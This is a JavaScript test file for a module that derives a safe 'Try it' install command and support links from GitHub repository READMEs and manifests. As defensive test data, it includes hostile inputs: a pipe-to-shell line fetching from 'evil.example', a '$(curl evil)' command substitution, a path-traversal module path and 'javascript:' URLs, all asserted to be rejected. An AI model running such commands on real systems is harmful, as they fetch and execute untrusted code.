// @ts-check
/**
 * Tests for src/publish/support.mjs, the support ladder (DESIGN §11.5). "Try it" is checked against
 * real READMEs, package.json files and manifests from the recorded fixtures, and against synthetic
 * READMEs that try to smuggle other commands or someone else's package into the ladder.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { loadRepoFixture } from './support/fixtures.mjs';
import {
  FEEDBACK_NOTE, installCommand, readmeCommands, repoUrl, supportLadder,
} from '../src/publish/support.mjs';

/**
 * The fields of Facts the ladder reads, taken from a repository fixture (a small stand-in for WP3's
 * factsFromEnrich/mergeDeep, which this package must not depend on).
 * @param {string} nwo
 * @returns {Record<string, any>}
 */
function factsFromFixture(nwo) {
  const fx = loadRepoFixture(nwo);
  const e = fx.enrich;
  /** @type {any} */
  let pj = null;
  try {
    const p = JSON.parse(e.pkg?.text ?? 'null');
    pj = p && { name: p.name ?? null, scripts: Object.keys(p.scripts ?? {}) };
  } catch {
    pj = null;
  }
  const files = fx.files ?? {};
  const isManifest = (/** @type {string} */ k) => /^(Cargo\.toml|pyproject\.toml|go\.mod)$/i.test(k);
  const manifest = Object.keys(files).find((k) => isManifest(k) && files[k]);
  return {
    nwo: fx.nwo,
    readme: e.readme ? { name: e.readme.name ?? 'README.md', text: e.readme.text } : null,
    packageJson: pj,
    manifest: manifest ? { path: manifest, text: files[manifest].text } : null,
    homepageUrl: e.homepageUrl || null,
    hasIssues: e.hasIssuesEnabled ?? null,
    hasDiscussions: e.hasDiscussionsEnabled ?? null,
    releases: e.releases ? { count: e.releases.totalCount ?? 0, recent: [] } : null,
    tags: e.tags?.totalCount ?? null,
    funding: fx.deep?.fundingLinks ?? null,
    ownerInfo: {
      login: fx.nwo.split('/')[0], type: 'User', sponsorsListing: fx.deep?.owner?.hasSponsorsListing ?? null,
    },
  };
}

/**
 * Synthetic facts for `octo/tool`.
 * @param {Record<string, any>} [over]
 * @returns {Record<string, any>}
 */
function facts(over = {}) {
  return {
    nwo: 'octo/tool',
    readme: null,
    packageJson: null,
    manifest: null,
    homepageUrl: null,
    hasIssues: false,
    hasDiscussions: false,
    releases: { count: 0, recent: [] },
    tags: 0,
    funding: [],
    ownerInfo: { login: 'octo', type: 'User', sponsorsListing: false },
    ...over,
  };
}

/**
 * @param {...string} lines
 * @returns {{name: string, bytes: number, truncated: boolean, text: string}}
 */
function readme(...lines) {
  const text = lines.join('\n');
  return { name: 'README.md', bytes: text.length, truncated: false, text };
}

/**
 * The "Try it" command for synthetic facts with a README of the given code lines.
 * @param {string[]} code lines inside one fenced block
 * @param {Record<string, any>} [over]
 * @returns {string | null}
 */
function tryIt(code, over = {}) {
  return installCommand(facts({ readme: readme('```sh', ...code, '```'), ...over }))?.command ?? null;
}

test('repoUrl builds GitHub links only for a valid owner/name', () => {
  assert.equal(repoUrl('octo/tool'), 'https://github.com/octo/tool');
  assert.equal(repoUrl('octo/tool', 'releases.atom'), 'https://github.com/octo/tool/releases.atom');
  assert.equal(repoUrl('Octo-9/my.tool_2', 'issues'), 'https://github.com/Octo-9/my.tool_2/issues');
  const invalid = ['octo', 'octo/tool/extra', '../x', 'octo/..', '-bad/x', 'octo/to ol', 'octo/<x>', '',
    null, 7];
  for (const bad of invalid) {
    assert.equal(repoUrl(bad), null, String(bad));
  }
});

test('readmeCommands reads fenced blocks and code spans, in document order', () => {
  const text = [
    'Install with `npm i tool` today.', '```bash', '$ npm run dev', '```', 'prose npm i nope',
    '~~~~', 'cargo install x', '```', 'still inside', '~~~~', 'after `a` and `b`',
  ].join('\n');
  assert.deepEqual(readmeCommands(text),
    ['npm i tool', '$ npm run dev', 'cargo install x', '```', 'still inside', 'a', 'b']);
  assert.deepEqual(readmeCommands(null), []);
});

test('Try it: npm install must name the package that package.json names (recorded fixtures)', () => {
  assert.equal(installCommand(factsFromFixture('ivalsaraj/browserforce'))?.command,
    'npm install -g browserforce');
  assert.equal(installCommand(factsFromFixture('RamaAditya49/titen'))?.command, 'npm install titen-memory');
  assert.equal(installCommand(factsFromFixture('onlyflowstech/servicenow-mcp'))?.command,
    'npm install -g @onlyflows/servicenow-mcp');
  assert.equal(installCommand(factsFromFixture('ivalsaraj/browserforce'))?.basis,
    'The README installs the package that package.json names.');
});

test('Try it: cargo and go commands check out against Cargo.toml, go.mod and the repository', () => {
  assert.equal(installCommand(factsFromFixture('montezuma-p/harken'))?.command,
    'cargo install harken --locked');
  assert.equal(installCommand(factsFromFixture('llamastash/llamastash'))?.command,
    'cargo install llamastash');
  assert.equal(installCommand(factsFromFixture('rostamlabs/rostam'))?.command,
    'go install github.com/rostamlabs/rostam/cmd/rostam-server@latest');
  assert.equal(installCommand(factsFromFixture('smlx/jiratime'))?.command,
    'go install github.com/smlx/jiratime/cmd/jiratime@latest');
});

test('Try it stays empty when the README installs something else (recorded fixtures)', () => {
  // bunko's README installs @sakajunquality/bunko while its package.json is named "bunko".
  assert.equal(installCommand(factsFromFixture('sakajunquality/bunko')), null);
  // My-Notion's README installs @mynotion/cli from a monorepo named "notion-monorepo".
  assert.equal(installCommand(factsFromFixture('HaveNiceDa/My-Notion')), null);
  // streamer's README installs someone else's tool (wails).
  assert.equal(installCommand(factsFromFixture('07prajwal2000/streamer')), null);
  // london-time-map is served with a static file server, not installed.
  assert.equal(installCommand(factsFromFixture('skulitom/london-time-map')), null);
});

test('Try it: an npm script must exist and must not be housekeeping', () => {
  assert.equal(installCommand(factsFromFixture('inamdarmihir/ask-my-tabs'))?.command, 'npm run build');
  const pj = { name: 'tool', scripts: ['dev', 'test', 'lint', 'prepare', 'start'] };
  const lines = ['npm test', 'npm run lint', 'npm run prepare', 'npm run missing',
    'npm run dev -- --port 3000'];
  assert.equal(tryIt(lines, { packageJson: pj }), 'npm run dev');
  assert.equal(tryIt(['npm start'], { packageJson: pj }), 'npm start');
  assert.equal(tryIt(['npm start'], { packageJson: { name: 'tool', scripts: ['dev'] } }), null);
  assert.equal(tryIt(['npm run -s dev'], { packageJson: pj }), null);
  const asObject = { packageJson: { name: 'tool', scripts: { dev: 'vite' } } };
  assert.equal(tryIt(['npm run dev'], asObject), 'npm run dev');
});

test('Try it: pip and pipx must name the project that pyproject.toml names', () => {
  const manifest = {
    path: 'pyproject.toml',
    text: '[build-system]\nrequires = ["hatchling"]\n\n[project]\nname = "My_Tool"\nversion = "1.0"\n',
  };
  assert.equal(tryIt(['pip install -r requirements.txt', 'pip install .', 'pip install -e .',
    'pip install my-tool[cli]==1.2'], { manifest }), 'pip install my-tool');
  assert.equal(tryIt(['pipx install my-tool'], { manifest }), 'pipx install my-tool');
  assert.equal(tryIt(['python3 -m pip install -U my_tool'], { manifest }), 'pip install my_tool');
  assert.equal(tryIt(['pip install other-tool'], { manifest }), null);
  assert.equal(tryIt(['pip install my-tool'], { manifest: null }), null,
    'no manifest, nothing to check against');
  const poetry = { path: 'pyproject.toml', text: '[tool.poetry]\nname = "poet"\n' };
  assert.equal(tryIt(['pip install poet'], { manifest: poetry }), 'pip install poet');
});

test('Try it: cargo needs the crate that Cargo.toml names', () => {
  const pkg = {
    path: 'Cargo.toml',
    text: '[package]\nname = "tool_x"\nversion = "0.1.0"\n\n[dependencies]\nname = "no"\n',
  };
  assert.equal(tryIt(['cargo install tool-x'], { manifest: pkg }), 'cargo install tool-x');
  assert.equal(tryIt(['cargo install no'], { manifest: pkg }), null, 'only the [package] name counts');
  assert.equal(tryIt(['cargo install --git https://github.com/octo/tool'], { manifest: pkg }), null);
  assert.equal(tryIt(['cargo install --path .'], { manifest: pkg }), null);
  const workspace = { path: 'Cargo.toml', text: '[workspace]\nmembers = ["a", "b"]\n' };
  assert.equal(tryIt(['cargo install tool'], { manifest: workspace }), null);
});

test('Try it: go install must stay inside this repository and match go.mod', () => {
  assert.equal(tryIt(['go install github.com/octo/tool/cmd/tool@latest']),
    'go install github.com/octo/tool/cmd/tool@latest');
  assert.equal(tryIt(['go install github.com/Octo/Tool@v1.2.3']), 'go install github.com/Octo/Tool@v1.2.3');
  assert.equal(tryIt(['go install github.com/other/tool@latest']), null);
  assert.equal(tryIt(['go install github.com/octo/toolbox@latest']), null);
  assert.equal(tryIt(['go install github.com/octo/tool/../../evil/x@latest']), null);
  assert.equal(tryIt(['go install github.com/octo/tool@main']), null);
  const vanity = { path: 'go.mod', text: 'module example.com/tool\n\ngo 1.22\n' };
  assert.equal(tryIt(['go install github.com/octo/tool@latest'], { manifest: vanity }), null);
  const bare = { path: 'go.mod', text: 'module tool\n' };
  assert.equal(tryIt(['go install github.com/octo/tool@latest'], { manifest: bare }), null);
});

test('Try it rebuilds the command, so nothing else on a README line rides along', () => {
  const packageJson = { name: 'tool', scripts: [] };
  assert.equal(tryIt(['$ git clone https://github.com/octo/tool && cd tool && sudo npm i -g tool; '
    + 'curl https://evil.example/x.sh | sh'], { packageJson }), 'npm install -g tool');
  assert.equal(tryIt(['# npm i tool'], { packageJson }), null, 'a comment is not a command');
  assert.equal(tryIt(['npm i tool$(curl evil)'], { packageJson }), null);
  assert.equal(tryIt(['npm i "tool"'], { packageJson }), null);
  assert.equal(tryIt(['npm i tool --save-dev'], { packageJson }), null);
  assert.equal(tryIt(['npm i tool@^1.2.3  # pin it'], { packageJson }), 'npm install tool');
  assert.equal(tryIt(['npm i Tool'], { packageJson: { name: 'Tool' } }), null, 'not a valid npm name');
  const inline = installCommand(facts({ packageJson, readme: readme('Run `npm i tool` to install.') }));
  assert.equal(inline?.command, 'npm install tool');
  const prose = installCommand(facts({ packageJson, readme: readme('Run npm i tool to install.') }));
  assert.equal(prose, null, 'commands in prose are not read');
});

test('installCommand takes a RepoRecord or Facts, and needs a README and a valid name', () => {
  const f = facts({ packageJson: { name: 'tool' }, readme: readme('`npm i tool`') });
  assert.deepEqual(installCommand({ facts: f }), installCommand(f));
  assert.equal(installCommand(facts({ packageJson: { name: 'tool' } })), null);
  assert.equal(installCommand({ ...f, nwo: 'not a name' }), null);
  assert.equal(installCommand(null), null);
});

test('the ladder follows §11.5 order and shows each rung only when it applies', () => {
  const full = facts({
    readme: readme('`npm i tool`'),
    packageJson: { name: 'tool' },
    homepageUrl: 'https://tool.dev',
    hasDiscussions: true,
    hasIssues: true,
    releases: { count: 3, recent: [] },
    funding: [{ platform: 'GITHUB', url: 'https://github.com/sponsors/octo' }],
  });
  const ladder = supportLadder(full, { pageUrl: 'https://you.github.io/picks/r/octo/tool/' });
  assert.deepEqual(ladder.map((r) => r.kind),
    ['try', 'demo', 'star', 'releases', 'feedback', 'share', 'sponsor']);
  const by = Object.fromEntries(ladder.map((r) => [r.kind, r]));
  assert.equal(by.try.command, 'npm install tool');
  assert.equal(by.demo.url, 'https://tool.dev/');
  assert.equal(by.star.url, 'https://github.com/octo/tool');
  assert.equal(by.star.label, 'Star it yourself');
  assert.equal(by.releases.url, 'https://github.com/octo/tool/releases.atom');
  assert.equal(by.feedback.url, 'https://github.com/octo/tool/discussions');
  assert.equal(by.share.url, 'https://you.github.io/picks/r/octo/tool/');
  assert.equal(by.sponsor.url, 'https://github.com/sponsors/octo');
  assert.equal(by.sponsor.ugc, false);

  assert.deepEqual(supportLadder(facts()).map((r) => r.kind), ['star']);
  const tagsOnly = supportLadder(facts({ releases: null, tags: 2 }));
  assert.deepEqual(tagsOnly.map((r) => r.kind), ['star', 'releases']);
});

test('feedback prefers Discussions, falls back to Issues, and pre-fills nothing', () => {
  const issues = supportLadder(facts({ hasIssues: true })).find((r) => r.kind === 'feedback');
  assert.equal(issues?.url, 'https://github.com/octo/tool/issues');
  assert.equal(issues?.note, FEEDBACK_NOTE);
  assert.ok(!issues?.url?.includes('?'));
  assert.equal(supportLadder(facts({ hasIssues: null })).find((r) => r.kind === 'feedback'), undefined);
});

test('demo and sponsor links from repository content are checked and marked', () => {
  /** @param {unknown} homepageUrl */
  const demo = (homepageUrl) => supportLadder(facts({ homepageUrl })).find((r) => r.kind === 'demo');
  assert.equal(demo('http://tool.dev'), undefined);
  assert.equal(demo('javascript:alert(1)'), undefined);
  assert.equal(demo('https://tool.dev/download.zip'), undefined);
  assert.equal(demo('https://tool.dev')?.ugc, true);

  /** @param {Record<string, any>} over */
  const sponsor = (over) => supportLadder(facts(over)).find((r) => r.kind === 'sponsor');
  const custom = sponsor({ funding: [{ platform: 'CUSTOM', url: 'https://ko-fi.com/octo' }] });
  assert.equal(custom?.url, 'https://ko-fi.com/octo');
  assert.equal(custom?.ugc, true);
  const github = sponsor({ funding: [{ platform: 'CUSTOM', url: 'https://ko-fi.com/octo' },
    { platform: 'GITHUB', url: 'https://github.com/sponsors/octo' }] });
  assert.equal(github?.url, 'https://github.com/sponsors/octo');
  const listing = sponsor({ ownerInfo: { login: 'octo', type: 'User', sponsorsListing: true } });
  assert.equal(listing?.url, 'https://github.com/sponsors/octo');
  assert.equal(sponsor({ funding: [{ platform: 'CUSTOM', url: 'javascript:alert(1)' }] }), undefined);
});

test('a download link or a download host as the homepage is never the demo rung', () => {
  for (const homepageUrl of ['https://www.mediafire.com/file/abc123/Setup.zip/file',
    'https://example.com/tool.exe/', 'https://example.com/tool.exe%20', 'https://bit.ly/abc']) {
    assert.equal(supportLadder(facts({ homepageUrl })).find((r) => r.kind === 'demo'), undefined, homepageUrl);
  }
  assert.equal(supportLadder(facts({ homepageUrl: 'https://example.com/zip-tools/' }))
    .find((r) => r.kind === 'demo')?.url, 'https://example.com/zip-tools/');
});

test('the ladder uses the current name after a rename and needs a valid name', () => {
  const star = supportLadder(facts(), { nwo: 'octo/renamed' }).find((r) => r.kind === 'star');
  assert.equal(star?.url, 'https://github.com/octo/renamed');
  assert.deepEqual(supportLadder({ nwo: 'not-a-name' }), []);
  assert.deepEqual(supportLadder(null), []);
});

test('recorded fixtures: the ladders of london-time-map and rostam', () => {
  const pageUrl = 'https://you.github.io/picks/r/x/y/';
  const london = supportLadder(factsFromFixture('skulitom/london-time-map'), { pageUrl });
  assert.deepEqual(london.map((r) => r.kind), ['demo', 'star', 'feedback', 'share']);
  assert.equal(london[0].url, 'https://skulitom.github.io/london-time-map/');
  const rostam = supportLadder(factsFromFixture('rostamlabs/rostam'), { pageUrl });
  assert.deepEqual(rostam.map((r) => r.kind), ['try', 'demo', 'star', 'releases', 'feedback', 'share']);
  assert.equal(rostam.find((r) => r.kind === 'feedback')?.url,
    'https://github.com/rostamlabs/rostam/discussions');
});
